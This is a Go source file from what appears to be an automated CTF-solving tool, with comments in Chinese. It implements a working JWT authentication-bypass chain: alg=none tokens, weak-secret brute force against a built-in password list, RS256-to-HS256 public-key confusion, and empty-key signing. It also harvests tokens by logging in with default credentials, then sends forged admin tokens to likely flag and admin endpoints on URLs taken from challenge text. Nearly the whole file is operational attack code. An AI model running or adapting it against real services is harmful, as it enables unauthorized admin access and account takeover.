package ctfplatform

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

// ───────────────────────── JWT 编解码 ─────────────────────────

func jwtB64Enc(b []byte) string { return base64.RawURLEncoding.EncodeToString(b) }

// jwtB64Dec base64url 解码（容错补齐 padding）。
func jwtB64Dec(s string) []byte {
	if m := len(s) % 4; m != 0 {
		s += strings.Repeat("=", 4-m)
	}
	b, err := base64.URLEncoding.DecodeString(s)
	if err != nil {
		return nil
	}
	return b
}

// reJWT 识别 JWT（header 段 base64url 解码后以 {" 开头 → 原始串几乎必以 eyJ 起始）。
var reJWT = regexp.MustCompile(`eyJ[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]*`)

// jwtHS256 对 signingInput("header.payload") 做 HMAC-SHA256，返回 base64url 签名段。
func jwtHS256(signingInput string, key []byte) string {
	m := hmac.New(sha256.New, key)
	_, _ = m.Write([]byte(signingInput))
	return jwtB64Enc(m.Sum(nil))
}

// jwtForgePayload 在原有 claims 上叠加 admin 提权字段并重新编码。
// 原 payload 非 JSON 时退化为最小 admin 载荷。
func jwtForgePayload(payloadSeg string) string {
	claims := map[string]interface{}{}
	if raw := jwtB64Dec(payloadSeg); len(raw) > 0 {
		_ = json.Unmarshal(raw, &claims)
	}
	// 提权：覆盖常见鉴权字段名（不同靶子字段名不同，全量覆盖提高命中率）
	claims["role"] = "admin"
	claims["user"] = "admin"
	claims["admin"] = true
	claims["isAdmin"] = true
	claims["is_admin"] = true
	claims["sub"] = "admin"
	claims["username"] = "admin"
	b, err := json.Marshal(claims)
	if err != nil {
		return payloadSeg
	}
	return jwtB64Enc(b)
}

// jwtHeaderFor 生成指定 alg 的 header 段。
func jwtHeaderFor(alg string) string {
	b, _ := json.Marshal(map[string]interface{}{"alg": alg, "typ": "JWT"})
	return jwtB64Enc(b)
}

// jwtSecrets 常见 CTF / 实战弱密钥表（HS256 爆破）。
var jwtSecrets = []string{
	"secret", "secret123", "password", "123456", "12345678", "admin", "key",
	"letmein", "changeme", "flag", "jwt", "test", "1234", "qwerty", "superman",
	"mysecret", "myscret", "topsecret", "s3cr3t", "s3cret", "passw0rd", "root",
	"default", "guest", "user", "auth", "token", "sign", "signature", "private",
	"public", "hs256", "hmac", "secretkey", "secret_key", "jwtsecret", "jwt_secret",
	"your-256-bit-secret", "your-secret-key", "super_secret", "master", "trustno1",
	"123456789", "iloveyou", "monkey", "dragon", "baseball", "football", "welcome",
}

// ───────────────────────── 攻击变体 ─────────────────────────

// jwtCandidates 依据一个已观测到的 JWT（可为空）产出全部伪造 token 候选。
//
// 攻击面：
//  1. alg=none       —— 服务端不校验签名，直接信任 claims（大小写变体全试）
//  2. 弱密钥爆破      —— HS256 密钥命中弱口令表 → 重签提权
//  3. RS256→HS256 混淆 —— 服务端把 RSA 公钥当 HMAC 密钥用，拿公钥字节重签
//  4. 空密钥          —— kid 指向 /dev/null 之类，HMAC key 为空
func jwtCandidates(observed string, pubkeys [][]byte) []string {
	var out []string

	// 基线：即使没拿到 JWT，也构造一个 admin 载荷
	basePayload := jwtForgePayload("")

	// ---- 攻击 1：alg=none（签名置空；带尾点/不带尾点都试）----
	for _, alg := range []string{"none", "None", "nOnE"} {
		si := jwtHeaderFor(alg) + "." + basePayload
		out = append(out, si+".", si)
	}

	// ---- 攻击 4：空密钥 ----
	out = append(out, jwtHeaderFor("HS256")+"."+basePayload+"."+jwtHS256(jwtHeaderFor("HS256")+"."+basePayload, []byte{}))

	if observed == "" {
		// 没有样本 token，弱密钥与公钥混淆无从验证，只返回通用变体
		return jwtDedup(out)
	}

	parts := strings.Split(observed, ".")
	if len(parts) != 3 {
		return jwtDedup(out)
	}
	signingInput, sig := parts[0]+"."+parts[1], parts[2]
	payload := jwtForgePayload(parts[1])

	// ---- 攻击 2：弱密钥爆破（先验证密钥，命中才重签，避免噪音请求）----
	for _, sec := range jwtSecrets {
		if hmac.Equal([]byte(jwtHS256(signingInput, []byte(sec))), []byte(sig)) {
			h := jwtHeaderFor("HS256")
			out = append(out, h+"."+payload+"."+jwtHS256(h+"."+payload, []byte(sec)))
			break
		}
	}

	// ---- 攻击 3：RS256→HS256 公钥混淆 ----
	for _, pk := range pubkeys {
		// 变体：原文 / 去首尾空白 / 保留尾部换行（服务端读取方式不同会导致密钥字节不同）
		variants := [][]byte{pk, []byte(strings.TrimSpace(string(pk))), append([]byte(strings.TrimSpace(string(pk))), '\n')}
		for _, kb := range variants {
			if len(kb) == 0 {
				continue
			}
			// 若观测 token 本身就是用该密钥签的，先确认再重签（降低误报）
			if hmac.Equal([]byte(jwtHS256(signingInput, kb)), []byte(sig)) {
				h := jwtHeaderFor("HS256")
				out = append(out, h+"."+payload+"."+jwtHS256(h+"."+payload, kb))
				break
			}
			// 即便不匹配也尝试（服务端可能对不同 endpoint 用不同校验路径）
			h := jwtHeaderFor("HS256")
			out = append(out, h+"."+payload+"."+jwtHS256(h+"."+payload, kb))
		}
	}

	return jwtDedup(out)
}

func jwtDedup(in []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, s := range in {
		if s == "" || seen[s] {
			continue
		}
		seen[s] = true
		out = append(out, s)
	}
	return out
}

// ───────────────────────── HTTP 探测 ─────────────────────────

const jwtMaxBody = 1 << 20

// jwtFetch 发一次请求，返回状态码与响应体（限长 1MiB）。
func jwtFetch(ctx context.Context, cl *http.Client, method, u, token string, formBody string) (int, []byte) {
	var body io.Reader
	if formBody != "" {
		body = strings.NewReader(formBody)
	}
	req, err := http.NewRequestWithContext(ctx, method, u, body)
	if err != nil {
		return 0, nil
	}
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
		req.Header.Set("Cookie", "token="+token+"; jwt="+token)
	}
	if formBody != "" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	req.Header.Set("User-Agent", "SecAutoMind/1.7")
	resp, err := cl.Do(req)
	if err != nil {
		return 0, nil
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, jwtMaxBody))
	return resp.StatusCode, b
}

// jwtFlagEndpoints 候选 flag/资源端点（题目线索优先，其次常见路径）。
func jwtFlagEndpoints(hints WebHints) []string {
	var out []string
	seen := map[string]bool{}
	add := func(p string) {
		p = strings.TrimSpace(p)
		if p == "" || seen[p] {
			return
		}
		seen[p] = true
		out = append(out, p)
	}
	// 题目 description 里写明的端点最准
	for _, e := range hints.Endpoints {
		add(e)
	}
	for _, e := range []string{"/api/flag", "/flag", "/admin", "/api/admin", "/api/admin/flag",
		"/api/data", "/api/user", "/api/me", "/api/profile", "/dashboard", "/api/protected"} {
		add(e)
	}
	return out
}

// jwtLoginEndpoints 候选登录/令牌签发端点。
func jwtLoginEndpoints(hints WebHints) []string {
	var out []string
	seen := map[string]bool{}
	add := func(p string) {
		p = strings.TrimSpace(p)
		if p == "" || seen[p] {
			return
		}
		seen[p] = true
		out = append(out, p)
	}
	for _, e := range hints.Endpoints {
		low := strings.ToLower(e)
		if strings.Contains(low, "login") || strings.Contains(low, "auth") ||
			strings.Contains(low, "token") || strings.Contains(low, "signin") {
			add(e)
		}
	}
	for _, e := range []string{"/api/login", "/login", "/api/auth", "/auth", "/api/token", "/api/signin"} {
		add(e)
	}
	return out
}

// jwtKeyEndpoints 候选公钥端点（RS256→HS256 混淆需要拿到公钥）。
func jwtKeyEndpoints(hints WebHints, base string) []string {
	var out []string
	seen := map[string]bool{}
	add := func(p string) {
		p = strings.TrimSpace(p)
		if p == "" || seen[p] {
			return
		}
		seen[p] = true
		out = append(out, p)
	}
	for _, e := range hints.Endpoints {
		low := strings.ToLower(e)
		if strings.Contains(low, "pem") || strings.Contains(low, "jwks") ||
			strings.Contains(low, "public") || strings.Contains(low, "key") {
			add(e)
		}
	}
	// 公钥常与登录接口同目录：由已知端点推导同级路径
	for _, e := range append([]string{}, hints.Endpoints...) {
		if i := strings.LastIndex(e, "/"); i > 0 {
			add(e[:i] + "/public.pem")
			add(e[:i] + "/jwks.json")
		}
	}
	for _, e := range []string{"/public.pem", "/jwks.json", "/.well-known/jwks.json", "/api/public.pem"} {
		add(e)
	}
	return out
}

// AttackJWT 对一个靶机执行 JWT 认证绕过链，返回命中的 flag。
//
// 流程：抓取端点 → 取样本 JWT（登录或直接抓响应）→ 取公钥 →
// 伪造 admin token（alg=none / 弱密钥 / 公钥混淆 / 空密钥）→ 打 flag 端点。
func AttackJWT(ctx context.Context, baseURL string, hints WebHints) []string {
	cl := webClient(6 * time.Second)
	base := strings.TrimRight(baseURL, "/")

	var observed string
	var pubkeys [][]byte

	// 1) 公钥素材
	for _, p := range jwtKeyEndpoints(hints, base) {
		_, b := jwtFetch(ctx, cl, http.MethodGet, base+p, "", "")
		if len(b) > 0 {
			pubkeys = append(pubkeys, b)
		}
	}

	// 2) 拿样本 JWT：先试登录接口，再试 flag 端点（有的靶子直接把 token 塞进首页）
	for _, p := range jwtLoginEndpoints(hints) {
		for _, form := range []string{"user=guest&pass=guest", "username=guest&password=guest", "user=admin&pass=admin"} {
			_, b := jwtFetch(ctx, cl, http.MethodPost, base+p, "", form)
			if m := reJWT.FindString(string(b)); m != "" {
				observed = m
				break
			}
		}
		if observed != "" {
			break
		}
	}
	if observed == "" {
		for _, p := range append([]string{"/"}, jwtFlagEndpoints(hints)...) {
			_, b := jwtFetch(ctx, cl, http.MethodGet, base+p, "", "")
			if m := reJWT.FindString(string(b)); m != "" {
				observed = m
				break
			}
		}
	}

	candidates := jwtCandidates(observed, pubkeys)

	// 3) 逐个 flag 端点 × 逐个伪造 token 打靶
	var flags []string
	seenFlag := map[string]bool{}
	record := func(b []byte) {
		for _, f := range bfxScanVariants(b) {
			if !seenFlag[f] {
				seenFlag[f] = true
				flags = append(flags, f)
			}
		}
	}

	for _, ep := range jwtFlagEndpoints(hints) {
		// 无 token 先探一次（有的靶子直接泄漏）
		if _, b := jwtFetch(ctx, cl, http.MethodGet, base+ep, "", ""); len(b) > 0 {
			record(b)
		}
		for _, tok := range candidates {
			if ctx.Err() != nil {
				return flags
			}
			_, b := jwtFetch(ctx, cl, http.MethodGet, base+ep, tok, "")
			record(b)
		}
	}
	return flags
}

// jwtAttackFromText 生产入口：从题目文本里识别 URL 并打 JWT 认证绕过。
func jwtAttackFromText(ctx context.Context, text string) []string {
	if strings.EqualFold(os.Getenv("SECAUTOMIND_WEB_EXPLOIT"), "0") {
		return nil
	}
	var targets []string
	for _, m := range reHTTPURL.FindAllString(text, 8) {
		u := strings.TrimRight(m, ".,;:)]}>\"'")
		if pu, err := url.Parse(u); err == nil &&
			(pu.Scheme == "http" || pu.Scheme == "https") && pu.Host != "" {
			targets = append(targets, strings.TrimRight(u, "/"))
		}
	}
	if len(targets) == 0 {
		return nil
	}
	if len(targets) > 2 {
		targets = targets[:2]
	}
	hints := ParseWebHints(text)

	var out []string
	for _, t := range targets {
		tctx, cancel := context.WithTimeout(ctx, 40*time.Second)
		out = append(out, AttackJWT(tctx, t, hints)...)
		cancel()
	}
	return jwtDedup(out)
}

func init() {
	RegisterSolver(SolverEntry{
		Name: "jwt_auth_bypass", Category: CategoryWebS, Priority: 25,
		Solver: func(ctx context.Context, text string, attachments map[string]string) []string {
			return jwtAttackFromText(ctx, text)
		},
	})
}
